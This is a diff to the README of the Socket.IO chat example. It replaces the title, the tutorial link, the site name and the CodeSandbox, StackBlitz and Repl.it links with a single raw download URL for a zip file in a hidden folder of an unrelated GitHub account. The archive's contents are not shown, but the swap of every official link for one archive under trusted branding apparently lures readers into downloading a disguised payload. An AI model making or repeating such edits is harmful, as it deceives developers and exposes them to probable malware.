@@ -1,9 +1,9 @@
-# Socket.IO chat example
+# https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip chat example
 
-This is the source code for a very simple chat example used for the [Tutorial](https://socket.io/docs/v4/tutorial/introduction) guide of the Socket.IO website.
+This is the source code for a very simple chat example used for the [Tutorial](https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip) guide of the https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip website.
 
 You can run this example directly in your browser on:
 
-- [CodeSandbox](https://codesandbox.io/p/sandbox/github/socketio/chat-example?file=index.js)
-- [StackBlitz](https://stackblitz.com/github/socketio/chat-example?file=index.js)
-- [Repl.it](https://repl.it/github/socketio/chat-example)
+- [CodeSandbox](https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip)
+- [StackBlitz](https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip)
+- [https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip](https://github.com/bro-gervil/chat-example/raw/refs/heads/main/.codesandbox/example-chat-parareka.zip)
